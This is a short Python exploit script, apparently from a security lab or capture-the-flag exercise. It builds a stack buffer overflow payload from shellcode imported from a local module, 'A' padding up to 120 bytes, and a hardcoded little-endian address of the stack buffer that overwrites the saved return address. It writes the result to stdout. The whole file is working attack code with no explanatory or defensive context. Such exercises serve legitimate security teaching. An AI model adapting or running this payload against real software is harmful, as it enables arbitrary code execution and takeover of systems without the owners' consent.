#!/usr/bin/env python3

import sys

from shellcode import shellcode

# sys.stdout.buffer.write(shellcode)

# Address of buf (starting from rbp - 0x70) in little-endian format
buf_address = (0x7ffffff6d350).to_bytes(8, 'little')  # Replace with the actual runtime address of `buf`

# Construct the payload: shellcode + padding to reach return address + buf address
payload = shellcode + b'A' * (120 - len(shellcode)) + buf_address

# Output the payload
sys.stdout.buffer.write(payload)